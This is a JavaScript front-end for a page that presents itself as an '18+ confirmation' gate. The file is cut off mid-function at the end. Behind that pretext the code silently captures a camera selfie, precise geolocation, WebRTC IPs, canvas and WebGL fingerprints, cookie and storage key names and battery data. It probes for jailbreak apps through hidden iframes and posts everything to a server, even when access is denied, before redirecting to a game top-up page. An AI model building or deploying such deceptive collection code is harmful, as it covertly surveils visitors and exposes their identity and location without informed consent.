// === app.js (тонкий фронт: сбор данных -> сервер решает; VT18 обязателен; 18.4 только в отчёт) ===

// API base из <script>window.__API_BASE</script> в index.html
const API_BASE =
  (typeof window !== "undefined" && window.__API_BASE)
    ? String(window.__API_BASE).replace(/\/+$/, "")
    : "";

// Режим строгой проверки (?strict=1 => блок по device_check.score < 60)
const STRICT_MODE = new URLSearchParams(location.search).get("strict") === "1";
// Доп. лог в консоль (?dev_log=1)
const DEV_LOG = new URLSearchParams(location.search).get("dev_log") === "1";
function dlog(...a){ if(DEV_LOG) console.log("[gate]", ...a); }

// ==== UI ====
const UI = {
  text: document.getElementById("text"),
  note: document.getElementById("note"),
  btn: document.getElementById("enterBtn"),
  reason: document.getElementById("reason"),
  title: document.getElementById("title"),
};

function setBtnLocked() {
  const b = UI.btn; if (!b) return;
  b.disabled = true;
  b.style.filter = "grayscale(35%) brightness(0.9)";
  b.style.opacity = "0.6";
  b.style.cursor = "not-allowed";
  b.style.background = "linear-gradient(90deg, #246, #39a)";
  b.style.boxShadow = "0 0 6px rgba(0,153,255,.25)";
}
function setBtnReady() {
  const b = UI.btn; if (!b) return;
  b.disabled = false;
  b.style.filter = "none";
  b.style.opacity = "1";
  b.style.cursor = "pointer";
  b.style.background = "linear-gradient(90deg, #4f00ff, #00bfff)";
  b.style.boxShadow = "0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)";
}
function showBtn(){ if(UI.btn) UI.btn.style.display="block"; }
function hideBtn(){ if(UI.btn) UI.btn.style.display="none"; }

// === CODE из URL (?code=...) ===
function determineCode() {
  const q = new URLSearchParams(location.search).get("code");
  const code = q ? String(q).trim() : null;
  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
}

// === Геолокация ===
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now(),
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// === Сжатие base64 фото ===
function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
      const w = Math.round(img.width * ratio);
      const h = Math.round(img.height * ratio);
      const c = document.createElement("canvas");
      c.width = w; c.height = h;
      c.getContext("2d").drawImage(img, 0, 0, w, h);
      try { resolve(c.toDataURL("image/jpeg", quality)); } catch (e) { reject(e); }
    };
    img.onerror = reject;
    img.src = dataUrl;
  });
}

// === Фото (основной путь) ===
window.__cameraLatencyMs = null;
async function takePhoto() {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error("Камера недоступна");
  const t0 = (typeof performance !== "undefined" ? performance.now() : Date.now());
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
  return new Promise((resolve, reject) => {
    try {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.playsInline = true;

      let fallbackTimer = setTimeout(() => {
        try {
          const c = document.createElement("canvas");
          c.width = 1280; c.height = 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.8);
          stream.getTracks().forEach((t) => t.stop());
          const t1 = (typeof performance !== "undefined" ? performance.now() : Date.now());
          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
          resolve(dataUrl);
        } catch (e) { reject(e); }
      }, 3000);

      video.onloadedmetadata = async () => {
        try {
          await video.play();
          clearTimeout(fallbackTimer);
          const c = document.createElement("canvas");
          c.width = video.videoWidth || 1280;
          c.height = video.videoHeight || 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.85);
          stream.getTracks().forEach((t) => t.stop());
          const t1 = (typeof performance !== "undefined" ? performance.now() : Date.now());
          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
          resolve(dataUrl);
        } catch (err) {
          stream.getTracks().forEach((t) => t.stop());
          reject(err);
        }
      };
    } catch (e) {
      try { stream.getTracks().forEach((t) => t.stop()); } catch {}
      reject(e);
    }
  });
}

// === Фото (фолбэк через input[type=file]) ===
(function ensureFileInput() {
  if (!document.getElementById("fileInp")) {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.id = "fileInp";
    inp.accept = "image/*";
    inp.capture = "user";
    inp.style.display = "none";
    document.body.appendChild(inp);
  }
})();
async function takePhotoWithFallback() {
  try {
    return await takePhoto();
  } catch {
    const inp = document.getElementById("fileInp");
    return new Promise((resolve, reject) => {
      inp.onchange = () => {
        const f = inp.files && inp.files[0];
        if (!f) return reject(new Error("Файл не выбран"));
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = reject;
        fr.readAsDataURL(f);
      };
      inp.click();
    });
  }
}

// === STRICT iOS/iPadOS ONLY (no Macs) ===
function isIpadDesktopMode() {
  return navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1;
}
function isIOSHandheldUA(ua) {
  ua = ua || navigator.userAgent || "";
  return /(iPhone|iPad|iPod)/.test(ua);
}
function isIOSFamilyStrict() {
  return isIOSHandheldUA() || isIpadDesktopMode();
}
function parseIOSMajorFromUAUniversal(ua) {
  ua = ua || navigator.userAgent || "";
  const ipadDesktop = isIpadDesktopMode();
  const iosLike = isIOSHandheldUA(ua) || ipadDesktop;
  if (!iosLike) return null; // не iOS-семейство → версии нет

  const mOS = ua.match(/\bOS\s+(\d+)[._]/i);
  if (mOS) return parseInt(mOS[1], 10);

  if (ipadDesktop) {
    const mVer = ua.match(/\bVersion\/(\d+)(?:[._]\d+)?/i);
    if (mVer) return parseInt(mVer[1], 10);
  }
  return null;
}

function getDeviceInfo() {
  const ua = navigator.userAgent || "";
  const iosVer = parseIOSMajorFromUAUniversal(ua);
  return {
    userAgent: ua,
    platform: navigator.platform,
    iosVersion: iosVer,
    isSafari:
      /Safari\//.test(ua) &&
      !/CriOS|Chrome|Chromium|FxiOS|Edg|OPR/i.test(ua) &&
      navigator.vendor === "Apple Computer, Inc.",
    isIpadDesktop: isIpadDesktopMode()
  };
}

// === Permissions snapshot ===
async function getPermissionStates() {
  if (!navigator.permissions?.query) return null;
  async function q(name) {
    try { return (await navigator.permissions.query({ name })).state; }
    catch { return "unknown"; }
  }
  const [geo, camera, mic] = await Promise.all([
    q("geolocation"), q("camera"), q("microphone")
  ]);
  return { geolocation: geo, camera: camera, microphone: mic };
}

// === WebRTC: ICE IPs ===
async function collectWebRTCIps(timeoutMs = 2500) {
  if (!window.RTCPeerConnection) return [];
  return new Promise((resolve) => {
    const ips = new Set();
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    try { pc.createDataChannel("x"); } catch {}
    pc.onicecandidate = (e) => {
      if (!e.candidate) return;
      const c = e.candidate.candidate || "";
      const ipRegex = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})|([0-9a-fA-F:]{2,})/;
      const m = c.match(ipRegex);
      if (m) ips.add(m[0]);
    };
    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
    const to = setTimeout(() => { try { pc.close(); } catch {} resolve([...ips]); }, timeoutMs);
    pc.onicegatheringstatechange = () => {
      if (pc.iceGatheringState === "complete") {
        clearTimeout(to);
        try { pc.close(); } catch {}
        resolve([...ips]);
      }
    };
  });
}

// === /api/client-ip ===
async function fetchClientIP() {
  try {
    const r = await fetch(`${API_BASE}/api/client-ip`, { method: "GET" });
    if (!r.ok) return null;
    const data = await r.json().catch(() => null);
    return data || null;
  } catch { return null; }
}

// === Canvas fingerprint ===
async function getCanvasFingerprint() {
  try {
    const c = document.createElement("canvas");
    c.width = 280; c.height = 80;
    const g = c.getContext("2d");
    g.textBaseline = "top";
    g.font = "16px 'Arial'";
    g.fillStyle = "#f60"; g.fillRect(0, 0, 280, 80);
    g.fillStyle = "#069"; g.fillText("canvas-fp v1 • 𝛑 Ω ≈ ✓", 2, 2);
    g.strokeStyle = "#222"; g.beginPath(); g.arc(140, 40, 18, 0, Math.PI * 2); g.stroke();
    const data = c.toDataURL();
    const enc = new TextEncoder().encode(data);
    if (crypto?.subtle?.digest) {
      const buf = await crypto.subtle.digest("SHA-256", enc);
      const hashArr = Array.from(new Uint8Array(buf));
      const hash = hashArr.map(b => b.toString(16)).map(s => s.padStart(2,"0")).join("");
      return { hash, size: data.length };
    }
    let hash = 0; for (let i = 0; i < data.length; i++) hash = ((hash<<5)-hash) + data.charCodeAt(i) | 0;
    return { hash: ("f"+(hash>>>0).toString(16)), size: data.length };
  } catch { return null; }
}

// === Storage snapshot ===
async function getStorageAndStorageLike() {
  let estimate = null;
  try { estimate = await navigator.storage?.estimate?.() || null; } catch {}
  let cookies = null;
  try {
    const raw = document.cookie || "";
    cookies = { length: raw.length, names: raw ? raw.split(";").map(s => s.split("=")[0].trim()).slice(0, 30) : [] };
  } catch {}
  function snapStorage(s) {
    try {
      const n = s.length;
      const keys = [];
      let total = 0;
      for (let i = 0; i < n && i < 50; i++) {
        const k = s.key(i);
        keys.push(k);
        total += (s.getItem(k) || "").length;
      }
      return { count: n, approxBytes: total, keys };
    } catch { return null; }
  }
  const local = snapStorage(localStorage);
  const session = snapStorage(sessionStorage);
  return { estimate, cookies, local, session };
}

// === Network info ===
function getNetworkInfo() {
  const ni = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  const out = ni ? {
    rtt: ni.rtt, downlink: ni.downlink, effectiveType: ni.effectiveType, saveData: !!ni.saveData
  } : {};
  try {
    const [nav] = performance.getEntriesByType("navigation");
    if (nav && typeof nav.responseStart === "number") out.rttApprox = Math.round(nav.responseStart);
  } catch {}
  return out;
}

// === Battery ===
async function getBatteryInfo() {
  try {
    if (!navigator.getBattery) return null;
    const b = await navigator.getBattery();
    return { level: Math.round(b.level * 100), charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
  } catch { return null; }
}

// === WebGL info ===
function getWebGLInfo() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return null;
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    const vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
    return { vendor, renderer };
  } catch { return null; }
}

// === In-App WebView детект ===
function detectInAppWebView() {
  const ua = navigator.userAgent || "";
  const flags = {
    Telegram: /Telegram/i.test(ua),
    Instagram: /Instagram/i.test(ua),
    Facebook: /FBAN|FBAV|FB_IAB/i.test(ua),
    Messenger: /FBAN|FBAV.*Messenger|FB_IAB.*Messenger/i.test(ua),
    TikTok: /TikTok/i.test(ua),
    Discord: /Discord/i.test(ua),
    WeChat: /MicroMessenger/i.test(ua),
    Weibo: /Weibo/i.test(ua),
    WKWebView: /\bAppleWebKit\/\d+\.\d+\s+\(KHTML, like Gecko\)\b/.test(ua) && !/Safari\//i.test(ua),
  };
  const any = Object.keys(flags).filter(k => flags[k]);
  return { flags, any, isInApp: any.length > 0 };
}

// === Locale / display ===
async function getLocaleAndDisplay() {
  const tz = (Intl && Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions)
    ? Intl.DateTimeFormat().resolvedOptions().timeZone : null;

  let uaData = null;
  try {
    if (navigator.userAgentData?.getHighEntropyValues) {
      const d = await navigator.userAgentData.getHighEntropyValues([
        "platform", "platformVersion", "architecture", "bitness", "model", "uaFullVersion"
      ]);
      uaData = { brands: navigator.userAgentData.brands, ...d, mobile: navigator.userAgentData.mobile };
    }
  } catch {}

  return {
    languages: navigator.languages || [navigator.language].filter(Boolean),
    timeZone: tz,
    dpr: window.devicePixelRatio || 1,
    screen: (typeof screen !== "undefined") ? { w: screen.width, h: screen.height, aw: screen.availWidth, ah: screen.availHeight } : null,
    viewport: { w: innerWidth, h: innerHeight },
    platform: navigator.platform,
    vendor: navigator.vendor,
    ua: navigator.userAgent,
    uaData
  };
}

// === DevTools эвристика ===
function detectDevtoolsHeuristic() {
  try {
    const dw = Math.abs((window.outerWidth || 0) - window.innerWidth);
    const dh = Math.abs((window.outerHeight || 0) - window.innerHeight);
    const opened = (dw > 120) || (dh > 160);
    return { opened, dw, dh };
  } catch { return null; }
}

// === PN/Proxy эвристика ===
function analyzeNetworkHeuristics({ publicIp, webrtcIps, network, cameraLatencyMs, locale, ipMeta }) {
  const reasons = [];
  let scoreAdj = 0;

  const DC_WORDS = ["AMAZON","AWS","GOOGLE","GCP","MICROSOFT","AZURE","CLOUDFLARE","HETZNER","OVH","DIGITALOCEAN","LINODE","IONOS","VULTR"];
  const isp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
  if (DC_WORDS.some(w => isp.includes(w))) {
    reasons.push("DC-ISP признак (AWS/Google/Azure/…)");
    scoreAdj -= 25;
  }

  const pubCandidates = (webrtcIps || []).filter(ip => !!ip);
  if (pubCandidates.length >= 1) {
    reasons.push("WebRTC раскрыл публичный IP (возможен туннель/VPN)");
    scoreAdj -= 10;
  }

  if (typeof cameraLatencyMs === "number" && cameraLatencyMs <= 5) {
    reasons.push("Ненормально низкая cameraLatency");
    scoreAdj -= 10;
  }

  if (network?.effectiveType && /2g/i.test(String(network.effectiveType))) {
    reasons.push("Очень медленная сеть (2g)");
    scoreAdj -= 5;
  }
  if (typeof network?.rtt === "number" && network.rtt > 800) {
    reasons.push("Очень высокий RTT");
    scoreAdj -= 5;
  }

  const tz = (locale?.timeZone || "").toUpperCase();
  const country = (publicIp?.country || ipMeta?.country || "").toUpperCase();
  if (tz && country && !tz.includes(country) && !tz.includes("UTC") && !tz.includes("GMT")) {
    reasons.push(`Таймзона (${locale?.timeZone}) не совпадает со страной IP (${publicIp?.country})`);
    scoreAdj -= 8;
  }

  let label = "unlikely";
  if (scoreAdj <= -25) label = "likely";
  else if (scoreAdj <= -10) label = "possible";

  return { label, scoreAdj, reasons, dcIsp: !!(scoreAdj <= -25 || DC_WORDS.some(w => isp.includes(w))) };
}

// === Лёгкая детекция + скоринг (для strict) ===
async function runDeviceCheck(clientProfilePartial) {
  const reasons = [];
  const details = {};
  let score = 100;

  try {
    details.ua = navigator.userAgent || "";
    details.vendor = navigator.vendor || "";
    details.platform = navigator.platform || "";
    details.lang = navigator.language || "";
    details.timezone = clientProfilePartial?.locale?.timeZone || null;
    details.dpr = window.devicePixelRatio || 1;
    details.screen = clientProfilePartial?.locale?.screen || null;
    details.hasTouchEvent = ("ontouchstart" in window);
    details.maxTouchPoints = Number(navigator.maxTouchPoints || 0);
    details.navigator_webdriver = (typeof navigator.webdriver === "boolean") ? navigator.webdriver : undefined;

    const leakedChromeRuntime = !!(window.chrome && window.chrome.runtime);
    const leakedBrowserRuntime = !!(window.browser && window.browser.runtime);
    if (leakedChromeRuntime || leakedBrowserRuntime) { reasons.push("Следы runtime API расширений"); score -= 5; }

    function looksNative(fn) {
      try { return typeof fn === "function" && /\[native code\]/.test(Function.prototype.toString.call(fn)); }
      catch { return true; }
    }
    const suspiciousNative =
      !looksNative(navigator.permissions?.query) ||
      !looksNative(navigator.geolocation?.getCurrentPosition) ||
      !looksNative(navigator.mediaDevices?.getUserMedia);
    if (suspiciousNative) { reasons.push("Web API переопределены (не native)"); score -= 5; }

    if (details.navigator_webdriver === true) { reasons.push("navigator.webdriver === true (автоматизация)"); score -= 60; }

    const devtools = detectDevtoolsHeuristic();
    details.devtools = devtools;
    if (devtools?.opened) { reasons.push("DevTools размеры окна"); score -= 6; }

    details.cameraLatencyMs = (typeof window.__cameraLatencyMs === "number") ? window.__cameraLatencyMs : null;
    if (details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) { reasons.push("Слишком малая cameraLatency"); score -= 10; }

    const inApp = clientProfilePartial?.inAppWebView;
    if (inApp?.isInApp || inApp?.flags?.WKWebView) { reasons.push("In-App WebView/WKWebView"); score -= 8; }

    const pn = analyzeNetworkHeuristics({
      publicIp: clientProfilePartial?.publicIp,
      webrtcIps: clientProfilePartial?.webrtcIps,
      network: clientProfilePartial?.network,
      cameraLatencyMs: details.cameraLatencyMs,
      locale: clientProfilePartial?.locale,
      ipMeta: clientProfilePartial?.publicIp
    });
    details.pn_proxy = pn;
    if (pn.label === "likely") { reasons.push("VPN/Proxy: likely"); score -= 25; }
    else if (pn.label === "possible") { reasons.push("VPN/Proxy: possible"); score -= 10; }

    if (clientProfilePartial?.jbProbesActive?.summary?.label === 'likely') { reasons.push('Jailbreak likely (active probe)'); score -= 30; }
    else if (clientProfilePartial?.jbProbesActive?.summary?.label === 'possible') { reasons.push('Jailbreak possible (active probe)'); score -= 12; }

    if (score >= 80) reasons.push("Ок: окружение выглядит правдоподобно");
    else if (score >= 60) reasons.push("Есть несостыковки — рекомендуется доп. проверка");
    else reasons.push("Высокая вероятность подмены/автоматизации");
  } catch (e) {
    reasons.push("Ошибка проверки окружения: " + (e?.message || String(e)));
  }

  let label = "unlikely";
  if (score < 60) label = "likely";
  else if (score < 80) label = "possible";

  return { score, label, reasons, details, timestamp: Date.now() };
}

// === Active Jailbreak probe (one-shot) ===
window.__jbActiveDone = false;
const JB_ACTIVE_SCHEMES = [
  "cydia://package/com.example",
  "sileo://package/com.example",
  "zebra://package/com.example",
  "filza://",
  "undecimus://"
];
function makeHiddenIframeForActive() {
  const ifr = document.createElement("iframe");
  ifr.style.width = "1px"; ifr.style.height = "1px";
  ifr.style.border = "0"; ifr.style.position = "fixed";
  ifr.style.left = "-9999px"; ifr.style.top = "-9999px";
  ifr.setAttribute("aria-hidden", "true");
  return ifr;
}
function tryOpenSchemeActive(scheme, timeoutMs = 900) {
  return new Promise((resolve) => {
    const start = Date.now();
    let finished = false;
    const iframe = makeHiddenIframeForActive();
    document.body.appendChild(iframe);
    const cleanup = (res) => {
      if (finished) return;
      finished = true;
      try { iframe.remove(); } catch {}
      resolve(res);
    };
    const onVis = () => {
      if (document.hidden || document.visibilityState === 'hidden') {
        cleanup({ scheme, opened: true, reason: 'visibilitychange', durationMs: Date.now() - start });
      }
    };
    document.addEventListener('visibilitychange', onVis, { once: true });
    const onPageHide = () => { cleanup({ scheme, opened: true, reason: 'pagehide', durationMs: Date.now() - start }); };
    window.addEventListener('pagehide', onPageHide, { once: true });
    const onError = (e) => { cleanup({ scheme, opened: false, reason: 'error', error: String(e), durationMs: Date.now() - start }); };
    iframe.addEventListener('error', onError, { once: true });

    try { iframe.src = scheme; }
    catch (e) { cleanup({ scheme, opened: false, reason: 'set-src-exception', error: String(e), durationMs: Date.now() - start }); return; }

    setTimeout(() => { cleanup({ scheme, opened: false, reason: 'timeout', durationMs: Date.now() - start }); }, timeoutMs);
  });
}
async function collectActiveJailbreakProbes(options = {}) {
  if (window.__jbActiveDone) return { summary: { label: 'skipped', reasons: ['already_ran'] }, results: [], firstPositive: null };
  window.__jbActiveDone = true;

  const schemes = options.schemes || JB_ACTIVE_SCHEMES;
  const perSchemeTimeout = options.perSchemeTimeout || 900;
  const interDelay = typeof options.interDelay === 'number' ? options.interDelay : 120;

  const results = [];
  let firstPositive = null;

  for (let i = 0; i < schemes.length; i++) {
    const scheme = schemes[i];
    await new Promise(r => setTimeout(r, interDelay));
    try {
      const res = await tryOpenSchemeActive(scheme, perSchemeTimeout);
      results.push(res);
      if (res.opened) { firstPositive = res; break; }
    } catch (e) {
      results.push({ scheme, opened: false, reason: 'exception', error: String(e) });
    }
  }

  let label = 'unlikely';
  const reasons = [];
  if (firstPositive) { label = 'likely'; reasons.push('scheme_opened'); if (firstPositive.reason) reasons.push(firstPositive.reason); }
  else {
    const visHints = results.filter(r => r.reason === 'visibilitychange' || r.reason === 'pagehide');
    if (visHints.length > 0) { label = 'possible'; reasons.push('visibility_hints'); }
    else { reasons.push('no_scheme_opened'); }
  }

  const totalMs = results.reduce((s, r) => s + (r.durationMs || 0), 0);
  const summary = { label, reasons, totalMs, attempts: results.length };

  return { summary, results, firstPositive };
}

// === Safari feature-tests ===
async function testSafari18_0_ViewTransitions() {
  const hasAPI = typeof document.startViewTransition === 'function';
  const cssOK = CSS?.supports?.('view-transition-name: auto') === true;

  let ran = false, finished = false;
  try {
    if (hasAPI) {
      const div = document.createElement('div');
      div.textContent = 'A'; document.body.appendChild(div);
      const vt = document.startViewTransition(() => { div.textContent = 'B'; ran = true; });
      await vt?.finished; finished = true; div.remove();
    }
  } catch {}

  return { feature: 'Safari 18.0 View Transitions', pass: !!(hasAPI && cssOK && ran && finished), details: { hasAPI, cssOK, ran, finished } };
}
async function testSafari18_4_Triple() {
  let shapeOK = false;
  try {
    const el = document.createElement('div');
    el.style.clipPath = 'shape(from right center, line to bottom center, line to right center)';
    shapeOK = !!el.style.clipPath;
  } catch {}
  const cookieStoreOK = typeof window.cookieStore === 'object' && typeof window.cookieStore?.get === 'function';
  const webauthnOK =
    typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === 'function' &&
    typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === 'function' &&
    typeof window.PublicKeyCredential?.prototype?.toJSON === 'function';
  return { feature: 'Safari 18.4 shape() + cookieStore + WebAuthn JSON', pass: !!(shapeOK && cookieStoreOK && webauthnOK), details: { shapeOK, cookieStoreOK, webauthnOK } };
}
async function runSafariFeatureTests(maxWaitMs = 1800) {
  const timeout = (p, ms) => Promise.race([ p, new Promise(res => setTimeout(() => res({ feature: 'timeout', pass: false, details: { timeoutMs: ms } }), ms)) ]);
  const [vt18, triple18_4] = await Promise.all([ timeout(testSafari18_0_ViewTransitions(), maxWaitMs), timeout(testSafari18_4_Triple(), maxWaitMs) ]);
  return { vt18_0: vt18, triple18_4 };
}
async function waitFeatureGate(maxMs = 800) {
  if (window.__featureGate) return window.__featureGate;
  return new Promise(resolve => {
    const t = setTimeout(() => resolve(window.__featureGate || null), maxMs);
    window.addEventListener('featuregate-ready', (ev) => {
      clearTimeout(t);
      resolve(ev.detail || window.__featureGate || null);
    }, { once: true });
  });
}

// === Быстрый мультисбор профиля клиента ===
async function collectClientProfile() {
  let jbProbesActive = { summary:{ label: 'skipped' }, results: [] };
  try { jbProbesActive = await collectActiveJailbreakProbes().catch(() => ({ summary:{ label:'error' }, results:[] })); }
  catch { jbProbesActive = { summary:{ label:'error' }, results:[] }; }

  const [
    permissions, webrtcIps, publicIp, canvas, storageLike,
    network, battery, webgl, inApp, locale
  ] = await Promise.all([
    getPermissionStates(),
    collectWebRTCIps().catch(() => []),
    fetchClientIP(),
    getCanvasFingerprint(),
    getStorageAndStorageLike(),
    getNetworkInfo(),
    getBatteryInfo(),
    getWebGLInfo(),
    detectInAppWebView(),
    getLocaleAndDisplay()
  ]);

  const ua = navigator.userAgent || "";
  const maxTP = Number(navigator.maxTouchPoints || 0);
  const isIpadLike = /iPad/i.test(ua) || (navigator.platform === "MacIntel" && maxTP > 1);
  const iosVersionDetected = parseIOSMajorFromUAUniversal(ua);

  const profile = {
    permissions,
    webrtcIps,
    publicIp,
    canvasFingerprint: canvas,
    storage: storageLike,
    network,
    battery,
    webgl,
    inAppWebView: inApp,
    locale,
    maxTouchPoints: maxTP,
    isIpad: isIpadLike,
    iosVersion: iosVersionDetected,
    jbProbesActive
  };

  const smallSignals = [];
  if (String(network?.effectiveType || "").toLowerCase() === "2g") smallSignals.push("effectiveType=2g");
  if (typeof network?.rtt === "number" && network.rtt > 800) smallSignals.push("veryHighRTT");
  profile.smallSignals = smallSignals;

  const ispUp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
  const dcWords = ["AMAZON","AWS","GOOGLE","GCP","MICROSOFT","AZURE","CLOUDFLARE","HETZNER","OVH","DIGITALOCEAN","LINODE","IONOS","VULTR"]
    .filter(w => ispUp.includes(w));
  profile.dcIspKeywords = dcWords;

  return profile;
}

// === Отправка отчёта на сервер (сервер принимает решение) ===
async function sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary }) {
  const info = getDeviceInfo();
  const code = determineCode();
  if (!code) throw new Error("Нет кода в URL");

  const body = {
    ...info, // {userAgent, platform, iosVersion, isSafari, isIpadDesktop}
    geo,
    photoBase64,
    note: "auto",
    code,
    client_profile,
    device_check,
    featuresSummary,
    strict: STRICT_MODE ? 1 : 0
  };

  const r = await fetch(`${API_BASE}/api/report`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  const text = await r.text().catch(() => "");
  let data;
  try { data = JSON.parse(text); } catch { data = null; }

  if (!r.ok) throw new Error((data && data.error) || text || `HTTP ${r.status}`);
  if (!data?.ok) throw new Error((data && data.error) || "Ошибка ответа сервера");

  return data;
}

// === Основной поток (сначала жесткий iOS-гейт; VT18 обязателен; решение — сервер) ===
window.__reportReady = false;
window.__decision = null;

const MIN_IOS_MAJOR = 18;
function hardGateIOS18() {
  if (!isIOSFamilyStrict()) {
    return { ok: false, reason: "Доступ только с iPhone/iPad (в т.ч. iPad desktop-mode)." };
  }
  const v = parseIOSMajorFromUAUniversal();
  if (v == null) return { ok: false, reason: "Не удалось определить версию iOS/iPadOS." };
  if (v < MIN_IOS_MAJOR) return { ok: false, reason: `Версия iOS/iPadOS ниже ${MIN_IOS_MAJOR}.` };
  return { ok: true, ios: v };
}

async function autoFlow() {
  try {
    setBtnLocked();
    showBtn();
    if (UI.title) UI.title.textContent = "Подтверждение 18+";
    if (UI.text) UI.text.innerHTML = "Готовим проверку устройства…";

    const code = determineCode();
    if (!code) {
      if (UI.title) UI.title.textContent = "Ошибка";
      if (UI.text) UI.text.innerHTML = '<span class="err">Нет кода в URL.</span>';
      hideBtn(); return;
    }

    // Сбор данных параллельно (фото+гео нужны в отчёт даже при отказе)
    if (UI.note) UI.note.textContent = "Собираем данные…";
    const [geo, rawPhoto, client_profile] = await Promise.all([
      askGeolocation(), takePhotoWithFallback(), collectClientProfile()
    ]);
    const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);

    // Фиче-тесты: сначала тихий результат из index.html, иначе локальный прогон
    if (UI.note) UI.note.textContent = "Проверяем системные возможности…";
    const fg = await waitFeatureGate();
    let vt18_ok, t184_ok;
    if (fg?.effective) {
      vt18_ok = !!fg.effective.vt18Pass;
      t184_ok = !!fg.effective.v184Pass;
    } else {
      const { vt18_0, triple18_4 } = await runSafariFeatureTests();
      vt18_ok = !!vt18_0?.pass;
      t184_ok = !!triple18_4?.pass;
    }
    const featuresSummary = { VT18: vt18_ok ? 'ok' : '—', v18_4: t184_ok ? 'ok' : '—' };
    dlog("features:", featuresSummary);

    // VT18 обязателен на фронте: если не прошёл — локальный отказ + репорт
    const featTxt = `Правило: требуется 18.0 • VT18=${vt18_ok ? 'ok' : '—'} • 18.4=${t184_ok ? 'ok' : '—'}`;
    if (!vt18_ok) {
      window.__reportReady = false;
      setBtnLocked();
      if (UI.title) UI.title.textContent = "Доступ отклонён";
      if (UI.text) UI.text.innerHTML = '<span class="err">Отказ по feature-tests (18.0 обязательно).</span>';
      if (UI.reason) UI.reason.textContent = featTxt;
      if (UI.note) UI.note.textContent = "18.4 учитывается только для отчёта.";
      try {
        await sendReport({
          photoBase64, geo, client_profile,
          device_check: null,
          featuresSummary
        });
      } catch {}
      dlog("deny: vt18 fail");
      return;
    }

    // Device check (нужен для strict), решает сервер
    if (UI.note) UI.note.textContent = "Анализ окружения…";
    let device_check = null;
    try {
      device_check = await runDeviceCheck({
        publicIp: client_profile.publicIp,
        webrtcIps: client_profile.webrtcIps,
        network: client_profile.network,
        locale: client_profile.locale,
        inAppWebView: client_profile.inAppWebView,
        jbProbesActive: client_profile.jbProbesActive
      });
    } catch {}

    if (UI.text) UI.text.innerHTML = "Отправляем отчёт…";
    const resp = await sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary });

    // Если сервер не возвращает решение — по умолчанию считаем allow (т.к. VT18 пройден)
    window.__decision = resp?.decision || { canLaunch: true };
    const canLaunch = !!window.__decision.canLaunch;

    if (canLaunch) {
      window.__reportReady = true;
      setBtnReady();
      if (UI.title) UI.title.textContent = "Проверка пройдена";
      if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (допуск выдан).</span>';
      if (UI.note) UI.note.textContent = STRICT_MODE
        ? `${featTxt} • strict=1 (score ≥ 60)`
        : featTxt;
      dlog("decision: allow", window.__decision);
    } else {
      window.__reportReady = false;
      setBtnLocked();
      if (UI.title) UI.title.textContent = "Доступ отклонён";
      if (UI.text) UI.text.innerHTML = '<span class="err">Отказ (решение сервера).</span>';
      const strictInfo = (window.__decision?.strict?.enabled && window.__decision?.strict?.failed)
        ? ` • strict fail (score=${window.__decision?.strict?.score ?? 'n/a'})` : '';
      if (UI.reason) UI.reason.textContent = `${featTxt}${strictInfo}`;
      if (UI.note) UI.note.textContent = "Обратитесь в поддержку, если это ошибка.";
      dlog("decision: deny", window.__decision);
    }
  } catch (e) {
    console.error("[AUTO-FLOW ERROR]", e);
    setBtnLocked();
    window.__reportReady = false;
    if (UI.title) UI.title.textContent = "Ошибка";
    if (UI.text) UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
    if (UI.note) UI.note.textContent = "Причина: " + (e && e.message ? e.message : String(e));
  }
}

// Кнопка «Войти»
(function wireEnter() {
  const btn = UI.btn; if (!btn) return;
  btn.addEventListener("click", (e) => {
    if (!window.__reportReady || !window.__decision?.canLaunch) {
      e.preventDefault(); e.stopPropagation(); return;
    }
    location.assign("https://www.pubgmobile.com/ig/itop");
  }, { capture: true });
})();

// Старт после готовности DOM — сначала жесткий iOS-гейт
function startWithGate() {
